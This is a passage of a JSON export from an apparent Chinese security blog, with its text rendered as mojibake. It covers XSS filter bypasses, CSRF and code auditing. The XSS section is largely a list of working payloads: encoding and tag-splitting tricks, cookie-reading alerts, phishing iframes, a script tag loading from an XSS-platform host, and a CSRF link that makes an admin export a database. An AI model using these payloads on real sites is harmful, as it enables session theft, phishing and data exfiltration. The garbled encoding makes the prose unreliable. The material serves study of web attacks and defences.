æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚ä½†æ˜¯ä»å­˜åœ¨ä¸€äº›æ¼æ´å¯ä»¥åˆ©ç”¨ï¼Œæ¥ç»•è¿‡è¿‡æ»¤æªæ–½ã€‚ â€‹ xssç»•è¿‡çš„æ–¹æ³•æœ‰è®¸å¤šï¼Œä¸»è¦å–å†³äºæ”»å‡»è€…çš„æ€è·¯å’Œå¯¹å‰ç«¯æŠ€æœ¯çš„æŒæ¡ï¼Œä»¥ä¸‹ä»‹ç»å‡ ä¸ªç®€å•çš„ç»•è¿‡æ–¹æ³•ã€‚ ï¼ˆ1ï¼‰å¯¹å‰ç«¯çš„é™åˆ¶å¯ä»¥å°è¯•è¿›è¡ŒæŠ“åŒ…é‡å‘æˆ–è€…ä¿®æ”¹å‰ç«¯çš„HTMLã€‚ ï¼ˆ2ï¼‰é˜²æ­¢åå°å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œæ­£åˆ™åŒ¹é…æ¥è¿‡æ»¤è¾“å…¥ï¼Œå¯¹äºè¿™æ ·çš„è¿‡æ»¤å¯ä»¥è€ƒè™‘å¤§å°å†™æ··åˆè¾“å…¥çš„æ–¹æ³•ã€‚ ä¾‹ï¼š&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; ï¼ˆ3ï¼‰é˜²æ­¢åå°å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œæ›¿æ¢ï¼Œé‡‡ç”¨æ‹¼æ‹¼å‡‘çš„è¾“å…¥æ–¹æ³•ã€‚ ä¾‹ï¼š&lt;sc&lt;script&gt;ript&gt;alert(&#39;ä½ æ‰“ç¯®çƒåƒoldboy&#39;)&lt;/scr&lt;script&gt;ipt&gt; ï¼ˆ4ï¼‰ä½¿ç”¨æ³¨é‡Šæ¥å¹²æ‰°åå°å¯¹è¾“å…¥å†…å®¹çš„è¯†åˆ«ã€‚ ä¾‹ï¼š&lt;sc&lt;!--test--&gt;ript&gt;alert(&#39;ä½ æ‰“ç¯®çƒåƒoldboy&#39;)&lt;/scr&lt;!--tshauie--&gt;ipt&gt; ï¼ˆ5ï¼‰ç¼–ç  æ€è·¯ï¼šåå°æœ‰å¯èƒ½ä¼šå¯¹ä»£ç ä¸­çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°è¯•å°†å…³é”®å­—è¿›è¡Œç¼–ç ååœ¨æ’å…¥ï¼Œæµè§ˆå™¨å¯¹æ”¹ç¼–ç è¿›è¡Œè¯†åˆ«æ—¶ï¼Œä¼šç¿»è¯‘æˆæ­£å¸¸çš„ä»£ç ã€‚ï¼ˆæ³¨æ„ï¼šç¼–ç åœ¨è¾“å‡ºæ—¶æ˜¯å¦ä¼šè¢«æ­£å¸¸è¯†åˆ«å’Œç¿»è¯‘æ‰æ˜¯å…³é”®ï¼Œä¸æ˜¯æ‰€æœ‰çš„ç¼–ç éƒ½æ˜¯å¯ä»¥çš„ï¼‰ ä¾‹ï¼šä½¿ç”¨äº‹ä»¶å±æ€§onerror(): &lt;img src=# onerror=&quot;alert(&#39;oldboy&#39;)&quot;/&gt; â€‹ ä½¿ç”¨HTMLè¿›è¡Œç¼–ç ï¼š ` &lt;img src=x onerror=â€&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;â€/&gt;` ï¼ˆ6ï¼‰æ ·å¼ç»•è¿‡ `&lt;div style=â€color: â€˜&lt;â€™; color: expression(alert(â€˜XSSâ€™))â€&gt;` (7)XSSç»•è¿‡ä¹‹htmlspecialchars()å‡½æ•° htmlspecialchars()å‡½æ•°æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚yangshiy é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š &amp; (å’Œå·)æˆä¸º &amp;amp â€œ (åŒå¼•å·)æˆä¸º &amp;quot â€™ (å•å¼•å·)æˆä¸º&amp;#039 &lt;(å°äº)æˆä¸º &amp;lt &gt;(å¤§äº)æˆä¸º &amp;gt è¯¥å‡½æ•°çš„è¯­æ³•ï¼šhtmlspecialchars(string,flags,character-set,double_encode) è¿‡æ»¤åŸç†ï¼šhtmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œä»è€Œä½¿XSSæ”»å‡»å¤±æ•ˆã€‚ä½†æ˜¯è¿™ä¸ªå‡½æ•°é»˜è®¤é…ç½®ä¸ä¼šå°†å•å¼•å·å’ŒåŒå¼•å·è¿‡æ»¤ï¼Œåªæœ‰è®¾ç½®äº†quotestyleè§„å®šå¦‚ä½•ç¼–ç å•å¼•å·å’ŒåŒå¼•å·æ‰èƒ½ä¼šè¿‡æ»¤æ‰å•å¼•å· å¯ç”¨çš„quotestyleç±»å‹ï¼š ENT_COMPAT - é»˜è®¤ã€‚ä»…ç¼–ç åŒå¼•å· ENT_QUOTES - ç¼–ç åŒå¼•å·å’Œå•å¼•å· ENT_NOQUOTES - ä¸ç¼–ç ä»»ä½•å¼•å· å¯ä½¿ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š qâ€™ onclick=â€™alert(111)â€™ (8) xssä¹‹hrefè¾“å‡ºç»•è¿‡ï¼šjavascript:alert(1111)ç›´æ¥ä»£å…¥aæ ‡ç­¾herfé‡Œé¢ä¸€æ ·å¯ä»¥ç»•è¿‡htmlspecialchars (9) xssä¹‹jsè¾“å‡ºç»•è¿‡ï¼š1&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt; æ€è·¯ï¼šåå°æœ‰å¯èƒ½ä¼šå¯¹ä»£ç ä¸­çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥å°è¯•å°†å…³é”®å­—è¿›è¡Œç¼–ç ååœ¨æ’å…¥ï¼Œæµè§ˆå™¨å¯¹æ”¹ç¼–ç è¿›è¡Œè¯†åˆ«æ—¶ï¼Œä¼šç¿»è¯‘æˆæ­£å¸¸çš„ä»£ç ã€‚ï¼ˆæ³¨æ„ï¼šç¼–ç åœ¨è¾“å‡ºæ—¶æ˜¯å¦ä¼šè¢«æ­£å¸¸è¯†åˆ«å’Œç¿»è¯‘æ‰æ˜¯å…³é”®ï¼Œä¸æ˜¯æ‰€æœ‰çš„ç¼–ç éƒ½æ˜¯å¯ä»¥çš„ï¼‰ phpstudyé…ç½®ä¼ªé™æ€ https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html ä¼ªé™æ€æ³¨å…¥çš„æ€»ç»“ https://www.cnblogs.com/jsq16/p/5942003.html XSSç›²æ‰“XSSç›²æ‰“å°±æ˜¯æ”»å‡»è€…åœ¨å‰ç«¯æäº¤çš„æ•°æ®ä¸çŸ¥é“åå°æ˜¯å¦å­˜åœ¨xssæ¼æ´çš„æƒ…å†µä¸‹ï¼Œæäº¤æ¶æ„JSä»£ç åœ¨ç±»ä¼¼ç•™è¨€æ¿ç­‰è¾“å…¥æ¡†åï¼Œæ‰€å±•ç°çš„åå°ä½ç½®çš„æƒ…å†µä¸‹ï¼Œç½‘ç«™é‡‡ç”¨äº†æ”»å‡»è€…æ’å…¥çš„æ¶æ„ä»£ç ï¼Œå½“åå°ç®¡ç†å‘˜åœ¨æ“ä½œæ—¶å°±ä¼šè§¦å‘æ’å…¥çš„æ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç›®çš„ã€‚ä¾‹å¦‚è¾“å…¥ï¼š &#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; ç®¡ç†å‘˜åå°ï¼š http://http://192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php è·¨ç«™è¯­å¥&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; å¤§å°å†™ç»•è¿‡&#39;&quot;&gt;&lt;IFRAME SRC=javascript:alert(&#39;XSXSSSs&#39;)&gt;&lt;/IFRAME&gt;&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XXSSSS&quot;)&lt;/scr&lt;/script&gt;ipt&gt; è¿‡æ»¤scriptç»•è¿‡&lt;img src=&quot;&quot;onerror=&quot;alert(&#39;xss&#39;)&quot;&gt; ç›´æ¥kæ‰scriptç»•è¿‡&lt;script&gt;eval(string.fromcharcode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script&gt; åŒ…å«alertå°±ç»•è¿‡ï¼ˆæ‹¬å·ä¸€ä¸²æ•°å­—æ˜¯alert(xss)çš„ASCIIå€¼ï¼‰&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; æ„é€ jsç»•è¿‡â€˜;alert(â€˜xssâ€™);â€™ htmlentitiesæ²¡æœ‰è¿‡æ»¤å•å¼•å·ï¼Œç›´æ¥ç”¨å•å¼•å·ç»•è¿‡ã€‚..../example8.php/[/url]&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; &quot;&lt; å½“post åœ°å€ä½¿ç”¨äº†å½“å‰urlçš„æ—¶å€™ï¼Œå¯è¿™æ ·ç»•è¿‡..../example9.php#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; é€šè¿‡æ„é€ ä¸€ä¸ªå¸¦xssçš„é”šç‚¹ç»•è¿‡&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;=&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;alert(1) è¿‡chromeé»˜è®¤xssè¿‡æ»¤å™¨http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx %22Onclick%3D(outerHTML%3DURL)|%26quot#&lt;img/src=# onerror=alert()&gt;%27%29%0D%0Aalert%28document.cookie%29%2F%2F &lt;script&gt;alert(&quot;è·¨ç«™&quot;)&lt;/script&gt; (æœ€å¸¸ç”¨ï¼‰&lt;img scr=javascript:alert(&quot;è·¨ç«™&quot;)&gt;&lt;/img&gt; http://www.example.com/MyApp.aspx?myvar= â€œ&gt;&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert(â€˜XSSâ€™))&gt; &lt;IFRAME SRC=javascript:alert(&#39;test&#39;)&gt;&lt;/IFRAME&gt;â€œ onclick=â€alert(1)â€&lt;img scr=&quot;javascrip&amp;#116&amp;#58 alert(/è·¨ç«™/)&gt;&lt;/img&gt;&lt;img scr=&quot;javas????cript:alert(/è·¨ç«™/)&quot; width=150&gt;&lt;/img&gt; (?ç”¨tabé”®å¼„å‡ºæ¥çš„ç©ºæ ¼ï¼‰&lt;img scr=&quot;#&quot; onerror=alert(/è·¨ç«™/)&gt;&lt;/img&gt;&lt;img scr=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;&lt;/img&gt;&lt;img scr=&quot;#&quot;/* */onerror=alert(/xss/) width=150&gt;&lt;/img&gt; (/**/ è¡¨ç¤ºæ³¨é‡Šï¼‰&lt;img src=vbscript:msgbox (&quot;xss&quot;)&gt;&lt;/img&gt;&lt;style&gt; input &#123;left:expression (alert(&#39;xss&#39;))&#125;&lt;/style&gt;&lt;div style=&#123;left:expression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;&lt;div style=&#123;left:exp/* */ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;&lt;div style=&#123;left:\\0065\\0078ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;html å®ä½“ &lt;div style=&#123;left:&amp;#ï½˜0065ï¼›xpression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;unicode &lt;div style=&quot;&#123;left:expRessioN (alert(&#39;xss&#39;))&#125;&quot;&gt; &quot;]&#125;%3Cscript%3Ealert(&#39;By b14ckb0y&#39;)%3C/script%3E&#123;[&amp;item=&quot;]&lt;iframe%20src=http://new.qzone.qq.com/9530772%20width=400%20height=600&gt;&lt;/iframe&gt;[&quot; /peixun/Search.asp?Field=&amp;Keyword=&amp;ClassID=0&amp;page=2/peixun/Search.asp?Field=&#39;/&gt;&lt;script&gt;alert(451)&lt;/script&gt;&amp;Keyword=&amp;ClassID=0&amp;page=2 Referer: &#39;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(312)&lt;/script&gt; ä¼ é€å¤´æ’å…¥ /peixun/Search.asp?Field=%27%22%3E%3Ciframe+id%3D445+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E /peixun/Search.asp?Field=&#39;&quot;&gt;&lt;iframe id=445 src=http://demo.testfire.net/phishing.html&gt; &lt;script src=&quot;http://192.168.1.55:8080/xssing-master/?u=f389c3&quot; &gt; &lt;/script&gt; &lt;script&gt;document.location=(&#39;http://www.baidu.com&#39;)&lt;/script&gt; &lt;script&gt;document.write(&#39;&lt;iframe src=http://www.baidu.com width=0 height=0&gt;&lt;/iframe&gt;&#39;);&lt;/script&gt; /user/User_Message.asp?Action=Manage&amp;ManageType=Inbox&amp;Field=Content%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%38%34%38%33%29%3c%2f%73%43%72%49%70%54%3e &lt;input id=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;ä¿å­˜ä¿®æ”¹ç»“æœ&quot; onclick=&quot;alert(1)&quot;/&gt; &lt; name=&quot;Submit&quot;&gt; http://www.xx.com/netsearch_pre.jsp?netname=1&quot; onmouseenter=â€prompt(/csits/) url=%0aX-XSS-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt; http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ ","slug":"CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ ","date":"2019-08-12T13:04:27.000Z","updated":"2020-09-20T09:00:58.368Z","comments":true,"path":"2019/08/12/CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ /","link":"","permalink":"https://zhangyanlady.github.io/2019/08/12/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/","excerpt":"","text":"æ€»ç»“å›¾ 1ã€ç”¨è‡ªå·±çš„è¯­è¨€æè¿°csrfæ”»å‡»åŸç†å½“ç”¨æˆ·ç™»å½•æŸä¸ªç½‘ç«™æ—¶ï¼Œäº§ç”Ÿä¼šè¯ï¼Œç„¶åå»ç‚¹å‡»å¸¦æœ‰csrfæ”»å‡»ç¨‹åºçš„webï¼ŒCSRFæ”»å‡»åˆ©ç”¨ç½‘ç«™å¯¹äºç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ï¼ŒæŒŸæŒç”¨æˆ·å½“å‰å·²ç™»é™†çš„Webåº”ç”¨ç¨‹åºï¼Œå»æ‰§è¡Œå¹¶éç”¨æˆ·æœ¬æ„çš„æ“ä½œã€‚ 2ã€csrfæ”»å‡»åˆ†ç±»CSRFæ¼æ´ä¸€èˆ¬åˆ†ä¸ºç«™å¤–å’Œç«™å†…ä¸¤ç§ç±»å‹ã€‚ CSRFç«™å¤–ç±»å‹çš„æ¼æ´æœ¬è´¨ä¸Šå°±æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„å¤–éƒ¨æäº¤æ•°æ®é—®é¢˜ã€‚é€šå¸¸ç¨‹åºå‘˜ä¼šè€ƒè™‘ç»™ä¸€äº›ç•™è¨€æˆ–è€…è¯„è®ºçš„è¡¨å•åŠ ä¸Šæ°´å°ä»¥é˜²æ­¢SPAMé—®é¢˜ï¼ˆè¿™é‡Œï¼ŒSPAMå¯ä»¥ç®€å•çš„ç†è§£ä¸ºåƒåœ¾ç•™è¨€ã€åƒåœ¾è¯„è®ºï¼Œæˆ–è€…æ˜¯å¸¦æœ‰ç«™å¤–é“¾æ¥çš„æ¶æ„å›å¤ï¼‰ï¼Œä½†æ˜¯æœ‰æ—¶ä¸ºäº†æé«˜ç”¨æˆ·çš„ä½“éªŒæ€§ï¼Œå¯èƒ½æ²¡æœ‰å¯¹ä¸€äº›æ“ä½œåšä»»ä½•é™åˆ¶ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥äº‹å…ˆé¢„æµ‹å¹¶è®¾ç½®è¯·æ±‚çš„å‚æ•°ï¼Œåœ¨ç«™å¤–çš„Webé¡µé¢é‡Œç¼–å†™è„šæœ¬ä¼ªé€ æ–‡ä»¶è¯·æ±‚ï¼Œæˆ–è€…å’Œè‡ªåŠ¨æäº¤çš„è¡¨å•ä¸€èµ·ä½¿ç”¨æ¥å®ç°GETã€POSTè¯·æ±‚ï¼Œå½“ç”¨æˆ·åœ¨ä¼šè¯çŠ¶æ€ä¸‹ç‚¹å‡»é“¾æ¥è®¿é—®ç«™å¤–Webé¡µé¢ï¼Œå®¢æˆ·ç«¯å°±è¢«å¼ºè¿«å‘èµ·è¯·æ±‚ã€‚ CSRFç«™å†…ç±»å‹çš„æ¼æ´åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ˜¯ç”±äºç¨‹åºå‘˜æ»¥ç”¨$_REQUESTç±»å˜é‡é€ æˆçš„ã€‚åœ¨ä¸€äº›æ•æ„Ÿçš„æ“ä½œä¸­ï¼ˆå¦‚ä¿®æ”¹å¯†ç ã€æ·»åŠ ç”¨æˆ·ç­‰ï¼‰ï¼Œæœ¬æ¥è¦æ±‚ç”¨æˆ·ä»è¡¨å•æäº¤å‘èµ·POSTè¯·æ±‚ä¼ é€’å‚æ•°ç»™ç¨‹åºï¼Œä½†æ˜¯ç”±äºä½¿ç”¨äº†$_REQUESTç­‰å˜é‡ï¼Œç¨‹åºé™¤æ”¯æŒæ¥æ”¶POSTè¯·æ±‚ä¼ é€’çš„å‚æ•°å¤–ä¹Ÿæ”¯æŒæ¥æ”¶GETè¯·æ±‚ä¼ é€’çš„å‚æ•°ï¼Œè¿™æ ·å°±ä¼šä¸ºæ”»å‡»è€…ä½¿ç”¨CSRFæ”»å‡»åˆ›é€ æ¡ä»¶ã€‚ä¸€èˆ¬æ”»å‡»è€…åªè¦æŠŠé¢„æµ‹çš„è¯·æ±‚å‚æ•°æ”¾åœ¨ç«™å†…ä¸€ä¸ªè´´å­æˆ–è€…ç•™è¨€çš„å›¾ç‰‡é“¾æ¥é‡Œï¼Œå—å®³è€…æµè§ˆäº†è¿™æ ·çš„é¡µé¢å°±ä¼šè¢«å¼ºè¿«å‘èµ·è¿™äº›è¯·æ±‚ã€‚ 3ã€csrfæ¼æ´æ£€æµ‹æ–¹æ³•ã€‚1ã€æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰Refererå­—æ®µåå†é‡æ–°æäº¤ï¼Œå¦‚æœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨CSRFæ¼æ´ 2ã€æ‰«æå™¨æ‰«æï¼Œä½†è¯¯æŠ¥è¾ƒé«˜ï¼Œåå°ç™»å½•ï¼Œä¿®æ”¹å¯†ç ç­‰å¯èƒ½æ‰«ä¸å‡ºcsrfæ¼æ´ 4ã€å®Œæˆcsrfè„±åº“ã€æ·»åŠ å¸å·ã€æ›´æ–°å¯†ç å®éªŒCsrfè„±åº“ï¼šä¸€èˆ¬xiazå¼€æºä»£ç å»è§‚çœ‹è·¯å¾„ä¸€èˆ¬ä¸ä¼šæ”¹å˜ï¼›ä¸€çº§ç›®å½•å¯ä»¥åœ¨urlä¸­çœ‹åˆ° åœ¨æ­å»ºå¥½çš„DZæ³¨å†Œæ™®é€šï¼Œç„¶åå‘å¸–ï¼Œæ’å…¥è¿œç¨‹å›¾ç‰‡ï¼ŒURLä¸ºï¼š http://192.168.0.106:8080/dzcrst/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa æ­¤é“¾æ¥ä¸ºæ•°æ®åº“å¤‡ä»½æ“ä½œ ç„¶åç®¡ç†å‘˜ç‚¹è¿›å»ä¾¿ä¼šæ‰§è¡Œå¯ä»¥å†™ä¸€äº›å¸å¼•ç®¡ç†å‘˜çš„æ–‡å­— æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®é»˜è®¤å¤‡ä»½è·¯å¾„åŠæˆ‘ä»¬é‡å‘½åçš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶åï¼šhttp://192.168.1.224:8082/dzcsrt/uc_server/data/backup/xxxx/aaaa-1.sql æ·»åŠ å¸å·ï¼š ä¿®æ”¹å¯†ç ï¼š å½“æˆ‘ä»¬ç™»å½•DVWAåï¼Œåœ¨CSRFä¸­ï¼š LOWçº§åˆ«æ—¶ï¼šç›´æ¥ä¿®æ”¹å¯†ç å³å¯ã€‚ mediumçº§åˆ«æ—¶ï¼šRefererå¾—ä¸ºç½‘ç«™ä¿®æ”¹é¡µé¢çš„è·¯å¾„ã€‚å¦åˆ™ä¼šä¿®æ”¹å¤±è´¥ 5ã€csrfé˜²èŒƒæ–¹æ³•ç›®å‰ä¸šç•ŒæœåŠ¡å™¨ç«¯é˜²å¾¡CSRFæ”»å‡»ä¸»è¦æœ‰5ç§ç­–ç•¥ï¼š 1éªŒè¯HTTP Refererå­—æ®µï¼ˆå¯ä»¥çªç ´ï¼‰ æ ¹æ®HTTPåè®®ï¼Œåœ¨HTTPå¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå«Refererï¼Œå®ƒè®°å½•äº†è¯¥HTTPè¯·æ±‚çš„æ¥æºåœ°å€ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®ä¸€ä¸ªå®‰å…¨å—é™é¡µé¢çš„è¯·æ±‚å¿…é¡»æ¥è‡ªäºåŒä¸€ä¸ªç½‘ç«™ã€‚ 2ã€åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ tokenå¹¶éªŒè¯ åœ¨è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äºCookieä¹‹ä¸­ã€‚é‰´äºæ­¤ï¼Œç³»ç»Ÿå¼€å‘è€…å¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ªtokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰tokenæˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯CSRFæ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚ 3ã€åœ¨HTTPå¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯ è‡ªå®šä¹‰å±æ€§çš„æ–¹æ³•ä¹Ÿæ˜¯ä½¿ç”¨tokenå¹¶è¿›è¡ŒéªŒè¯ï¼Œå’Œå‰ä¸€ç§æ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯æŠŠtokenä»¥å‚æ•°çš„å½¢å¼ç½®äºHTTPè¯·æ±‚ä¹‹ä¸­ï¼Œè€Œæ˜¯æŠŠå®ƒæ”¾åˆ°HTTPå¤´ä¸­è‡ªå®šä¹‰çš„å±æ€§é‡Œã€‚é€šè¿‡XMLHttpRequestè¿™ä¸ªç±»ï¼Œå¯ä»¥ä¸€æ¬¡æ€§ç»™æ‰€æœ‰è¯¥ç±»è¯·æ±‚åŠ ä¸Šcsrftokenè¿™ä¸ªHTTPå¤´å±æ€§ï¼Œå¹¶æŠŠtokenå€¼æ”¾å…¥å…¶ä¸­ã€‚è¿™æ ·è§£å†³äº†å‰ä¸€ç§æ–¹æ³•åœ¨è¯·æ±‚ä¸­åŠ å…¥tokençš„ä¸ä¾¿ï¼ŒåŒæ—¶ï¼Œé€šè¿‡è¿™ä¸ªç±»è¯·æ±‚çš„åœ°å€ä¸ä¼šè¢«è®°å½•åˆ°æµè§ˆå™¨çš„åœ°å€æ ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒtokenä¼šé€šè¿‡Refereræ³„éœ²åˆ°å…¶ä»–ç½‘ç«™ã€‚ 4ã€åœ¨æœåŠ¡ç«¯åŒºä¸¥æ ¼åŒºåˆ†å¥½POSTä¸GETçš„æ•°æ®è¯·æ±‚ å¦‚åœ¨aspä¸­ä¸è¦ä½¿ç”¨Requestæ¥ç›´æ¥è·å–æ•°æ®ã€‚åŒæ—¶å»ºè®®ä¸è¦ç”¨GETè¯·æ±‚æ¥æ‰§è¡ŒæŒä¹…æ€§æ“ä½œï¼Œå¦‚ï¼šhttp://www.yeeyan.com/space/deleteEvent/16824ã€‚ 5ã€ä½¿ç”¨éªŒè¯ç æˆ–è€…å¯†ç ç¡®è®¤æ–¹å¼è¿›è¡Œ 6ã€ç”¨æˆ·ç«¯é˜²å¾¡ ç”¨æˆ·å…»æˆè‰¯å¥½çš„ä¸Šç½‘ä¹ æƒ¯ï¼Œåˆ™èƒ½å¤Ÿå¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘CSRFæ”»å‡»çš„å±å®³ 7ã€å®‰å…¨è®¾å¤‡é˜²å¾¡ ç”¨æˆ·å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰æ–¹çš„ä¸“ä¸šå®‰","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","date":"2019-08-10T04:40:42.000Z","updated":"2020-09-20T08:54:55.502Z","comments":true,"path":"2019/08/10/ä»£ç å®¡è®¡/","link":"","permalink":"https://zhangyanlady.github.io/2019/08/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"ğŸƒæºä»£ç å®¡è®¡åˆ†ç±» ç™½ç›’ï¼šæ‹¥æœ‰æºä»£ç è¿›è¡Œå®¡è®¡ é»‘ç›’ï¼šä¸çŸ¥é“æºä»£ç çš„æƒ…å†µä¸‹è¿›è¡Œæ¸—é€å®¡è®¡ ç°ç›’ï¼šä»‹äºé»‘ç›’ä¸ç™½ç›’ä¹‹é—´ ğŸ§¨å®¡è®¡æ–¹æ³•æ€»ç»“ ä¸»è¦ä»£ç å®¡è®¡æ–¹æ³•æ˜¯è·Ÿè¸ªç”¨æˆ·è¾“å…¥æ•°æ®å’Œæ•æ„Ÿå‡½æ•°å‚æ•°å›æº¯ï¼š è·Ÿè¸ªç”¨æˆ·çš„è¾“å…¥æ•°æ®ï¼Œåˆ¤æ–­æ•°æ®è¿›å…¥çš„æ¯ä¸€ä¸ªä»£ç é€»è¾‘æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„ç‚¹ï¼Œæ­¤å¤„çš„ä»£ç é€»è¾‘ å¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ–è€…æ˜¯æ¡å°å°çš„æ¡ä»¶åˆ¤æ–­è¯­å¥ã€‚ æ•æ„Ÿå‡½æ•°å‚æ•°å›æº¯ï¼Œæ ¹æ®æ•æ„Ÿå‡½æ•°ï¼Œé€†å‘è¿½è¸ªå‚æ•°ä¼ é€’çš„è¿‡ç¨‹ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯æœ€é«˜æ•ˆï¼Œæœ€å¸¸ç”¨ 